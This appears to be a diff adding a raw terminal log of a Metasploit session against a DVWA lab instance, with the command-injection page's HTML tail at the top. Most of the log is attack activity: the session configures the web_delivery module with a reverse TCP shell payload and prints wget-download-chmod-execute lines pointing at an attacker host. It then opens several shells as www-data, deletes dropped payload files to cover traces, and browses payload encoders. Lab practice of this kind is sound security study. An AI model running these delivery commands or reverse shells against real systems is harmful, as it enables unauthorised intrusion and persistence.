+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+				<script src='../..//dvwa/js/add_event_listeners.js'></script>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>[0m
+[[41mcritical[0m] 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ fg
+msfconsole -q
+
+
+[0m
+
+
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> ll
+[0m[1m[31m[-][0m Unknown command: ll.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/shell/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  6666             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[31m[-][0m Handler failed to bind to 10.10.10.10:6666:-  -
+[1m[31m[-][0m Handler failed to bind to 0.0.0.0:6666:-  -
+[1m[31m[-][0m Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:6666).
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit hexploit [Cexploit lexploit pexploit  exploit 
+[0mUsage: exploit [options]
+
+Launches an exploitation attempt.
+
+OPTIONS:
+
+    -J        Force running in the foreground, even if passive.
+    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
+    -f        Force the exploit to run regardless of the value of MinimumRank.
+    -h        Help banner.
+    -j        Run in the context of a job.
+    -n <opt>  The NOP generator to use.  If none is specified, NOP is used.
+    -o <opt>  A comma separated list of options in VAR=VAL format.
+    -p <opt>  The payload to use.  If none is specified, PAYLOAD is used.
+    -t <opt>  The target index to use.  If none is specified, TARGET is used.
+    -z        Do not interact with the session after successful exploitation.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/shell/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  6666             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set LPORT 6677
+[0mLPORT => 6677
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m[1m[34m[*][0m Exploit running as background job 2.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:6677 
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [1m[34m[*][0m Using URL: http://0.0.0.0:8080/jNzSlDzL2rb6Z5t
+[1m[34m[*][0m Local IP: http://10.10.10.10:8080/jNzSlDzL2rb6Z5t
+[1m[34m[*][0m Server started.
+[1m[34m[*][0m Run the following command on the target machine:
+wget -qO fxeUxNBj --no-check-certificate http://10.10.10.10:8080/jNzSlDzL2rb6Z5t; chmod +x fxeUxNBj; ./fxeUxNBj& disown
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+[1m[34m[*][0m Sending stage (38 bytes) to 10.10.10.8
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+[1m[34m[*][0m Command shell session 2 opened (10.10.10.10:6677 -> 10.10.10.8:34032) at 2020-08-27 15:13:42 +0530
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  2         shell x64/linux               10.10.10.10:6677 -> 10.10.10.8:34032 (10.10.10.8)
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions -i 2 
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+
+w
+ 05:44:15 up  3:20,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+exit
+[1m[34m[*][0m 10.10.10.8 - Command shell session 2 closed.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> e[Kshow options p
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/shell/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  6677             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[1m[31m[-][0m Invalid parameter "p", use "show -h" for more information
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sey [K[Kt LPORT 6688
+[0mLPORT => 6688
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m[1m[34m[*][0m Exploit running as background job 3.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:6688 
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show [1m[34m[*][0m Using URL: http://0.0.0.0:8080/lcr2ba
+[1m[34m[*][0m Local IP: http://10.10.10.10:8080/lcr2ba
+[1m[34m[*][0m Server started.
+[1m[34m[*][0m Run the following command on the target machine:
+wget -qO zd34oGE9 --no-check-certificate http://10.10.10.10:8080/lcr2ba; chmod +x zd34oGE9; ./zd34oGE9& disown
+i[K[K[K
+[0m[1m[31m[-][0m Unknown command: sho.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+[1m[34m[*][0m 10.10.10.10      web_delivery - Delivering Payload (250 bytes)
+[1m[34m[*][0m 10.10.10.10      web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.10      web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m Sending stage (38 bytes) to 10.10.10.8
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [1m[34m[*][0m Command shell session 3 opened (10.10.10.10:6688 -> 10.10.10.8:47514) at 2020-08-27 16:17:12 +0530
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  3         shell x64/linux               10.10.10.10:6688 -> 10.10.10.8:47514 (10.10.10.8)
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> SESSIsessions [K -I [K[KI 3
+[0m
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  3         shell x64/linux               10.10.10.10:6688 -> 10.10.10.8:47514 (10.10.10.8)
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions -i 3
+[0m[1m[34m[*][0m Starting interaction with 3...
+
+^L  s pwd
+/var/www/html/vulnerabilities/exec
+ls
+L6fsJ9xI
+fxeUxNBj
+help
+index.php
+lcr2ba
+lcr2ba.1
+lcr2ba.2
+lcr2ba.3
+lcr2ba.4
+lcr2ba.5
+lcr2ba.6
+out.txt
+source
+rm lcr*
+ls
+L6fsJ9xI
+fxeUxNBj
+help
+index.php
+out.txt
+source
+ls
+L6fsJ9xI
+fxeUxNBj
+help
+index.php
+out.txt
+source
+e,  rM   m L6*
+ls
+fxeUxNBj
+help
+index.php
+out.txt
+source
+rm fxe*
+ls
+help
+index.php
+out.txt
+source
+^C
+Abort session 3? [y/N]  y
+""
+
+[1m[34m[*][0m 10.10.10.8 - Command shell session 3 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m Sending stage (38 bytes) to 10.10.10.8
+[1m[34m[*][0m Command shell session 4 opened (10.10.10.10:6688 -> 10.10.10.8:47536) at 2020-08-27 16:24:13 +0530
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  4         shell x64/linux               10.10.10.10:6688 -> 10.10.10.8:47536 (10.10.10.8)
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions -i 4 
+[0m[1m[34m[*][0m Starting interaction with 4...
+
+
+
+e w
+ 06:54:44 up  4:31,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+whoap mio
+/bin/sh: 4: whoamio: not found
+whoami
+www-data
+ls
+help
+index.php
+lcr2ba
+out.txt
+source
+r,   m lcd r*
+ls
+help
+index.php
+out.txt
+source
+rm out*
+ls
+help
+index.php
+source
+^C
+Abort session 4? [y/N]  ^C""
+
+[1m[34m[*][0m 10.10.10.8 - Command shell session 4 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ fg
+msfconsole -q
+
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> ;;;[K[K[K[H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use encoder/
+use encoder/cmd/brace                     use encoder/ppc/longxor_tag               use encoder/x86/context_cpuid
+use encoder/cmd/echo                      use encoder/ruby/base64                   use encoder/x86/context_stat
+use encoder/cmd/generic_sh                use encoder/sparc/longxor_tag             use encoder/x86/context_time
+use encoder/cmd/ifs                       use encoder/x64/xor                       use encoder/x86/countdown
+use encoder/cmd/perl                      use encoder/x64/xor_context               use encoder/x86/fnstenv_mov
+use encoder/cmd/powershell_base64         use encoder/x64/xor_dynamic               use encoder/x86/jmp_call_additive
+use encoder/cmd/printf_php_mq             use encoder/x64/zutto_dekiru              use encoder/x86/nonalpha
+use encoder/generic/eicar                 use encoder/x86/add_sub                   use encoder/x86/nonupper
+use encoder/generic/none                  use encoder/x86/alpha_mixed               use encoder/x86/opt_sub
+use encoder/mipsbe/byte_xori              use encoder/x86/alpha_upper               use encoder/x86/service
+use encoder/mipsbe/longxor                use encoder/x86/avoid_underscore_tolower  use encoder/x86/shikata_ga_nai
+use encoder/mipsle/byte_xori              use encoder/x86/avoid_utf8_tolower        use encoder/x86/single_static_bit
+use encoder/mipsle/longxor                use encoder/x86/bloxor                    use encoder/x86/unicode_mixed
+use encoder/php/base64                    use encoder/x86/bmp_polyglot              use encoder/x86/unicode_upper
+use encoder/ppc/longxor                   use encoder/x86/call4_dword_xor           use encoder/x86/xor_dynamic
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use encoder/x
+use encoder/x64/xor                       use encoder/x86/bloxor                    use encoder/x86/nonalpha
+use encoder/x64/xor_context               use encoder/x86/bmp_polyglot              use encoder/x86/nonupper
+use encoder/x64/xor_dynamic               use encoder/x86/call4_dword_xor           use encoder/x86/opt_sub
+use encoder/x64/zutto_dekiru              use encoder/x86/context_cpuid             use encoder/x86/service
+use encoder/x86/add_sub                   use encoder/x86/context_stat              use encoder/x86/shikata_ga_nai
+use encoder/x86/alpha_mixed               use encoder/x86/context_time              use encoder/x86/single_static_bit
+use encoder/x86/alpha_upper               use encoder/x86/countdown                 use encoder/x86/unicode_mixed
+use encoder/x86/avoid_underscore_tolower  use encoder/x86/fnstenv_mov               use encoder/x86/unicode_upper
+use encoder/x86/avoid_utf8_tolower        use encoder/x86/jmp_call_additive         use encoder/x86/xor_dynamic
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use encoder/x[H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use encoder/x64/
+use encoder/x64/xor           use encoder/x64/xor_context   use encoder/x64/xor_dynamic   use encoder/x64/zutto_dekiru
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use encoder/x64/[K[K[K[K
+use encoder/cmd/brace                     use encoder/ppc/longxor_tag               use encoder/x86/context_cpuid
+use encoder/cmd/echo                      use encoder/ruby/base64                   use encoder/x86/context_stat
+use encoder/cmd/generic_sh                use encoder/sparc/longxor_tag             use encoder/x86/context_time
+use encoder/cmd/ifs                       use encoder/x64/xor                       use encoder/x86/countdown
+use encoder/cmd/perl                      use encoder/x64/xor_context               use encoder/x86/fnstenv_mov
+use encoder/cmd/powershell_base64         use encoder/x64/xor_dynamic               use encoder/x86/jmp_call_additive
+use encoder/cmd/printf_php_mq             use encoder/x64/zutto_dekiru              use encoder/x86/nonalpha
+use encoder/generic/eicar                 use encoder/x86/add_sub                   use encoder/x86/nonupper
+use encoder/generic/none                  use encoder/x86/alpha_mixed               use encoder/x86/opt_sub
+use encoder/mipsbe/byte_xori              use encoder/x86/alpha_upper               use encoder/x86/service
+use encoder/mipsbe/longxor                use encoder/x86/avoid_underscore_tolower  use encoder/x86/shikata_ga_nai
+use encoder/mipsle/byte_xori              use encoder/x86/avoid_utf8_tolower        use encoder/x86/single_static_bit
+use encoder/mipsle/longxor                use encoder/x86/bloxor                    use encoder/x86/unicode_mixed
+use encoder/php/base64                    use encoder/x86/bmp_polyglot              use encoder/x86/unicode_upper
+use encoder/ppc/longxor                   use encoder/x86/call4_dword_xor           use encoder/x86/xor_dynamic
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use encoder/[H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use encoder/Interrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [0m
+[1m[34m[*][0m Server stopped.
+[1m[34m[*][0m Server stopped.
+[1m[34m[*][0m Server stopped.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ exit
+
+Script done on 2020-08-27 16:38:14+05:30 [COMMAND_EXIT_CODE="0"]
